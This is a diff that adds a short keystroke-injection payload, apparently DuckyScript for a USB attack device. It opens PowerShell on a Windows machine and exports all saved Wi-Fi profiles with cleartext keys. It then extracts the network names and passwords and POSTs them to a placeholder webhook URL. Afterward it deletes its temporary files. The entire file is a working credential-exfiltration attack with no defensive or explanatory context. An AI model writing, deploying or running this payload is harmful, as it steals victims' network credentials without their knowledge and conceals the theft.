@@ -1,0 +1,7 @@
+GUI r
+DELAY 750
+STRING powershell
+ENTER
+DELAY 750
+STRINGLN $p="$env:temp\p";md $p >$null;cd $p;netsh wlan export profile key=clear >$null;$r=ls|%{$Xml=[xml](gc $_.FullName);[PSCustomObject]@{Name=$Xml.WLANProfile.Name;Password=$Xml.WLANProfile.MSM.Security.SharedKey.KeyMaterial}};$body=@{content="``````"+($r|ft|Out-String)+"``````"};curl -Uri 'webhook_here' -Method post -Body $body >$null;cd ..;rm $p -r -fo;exit;
+
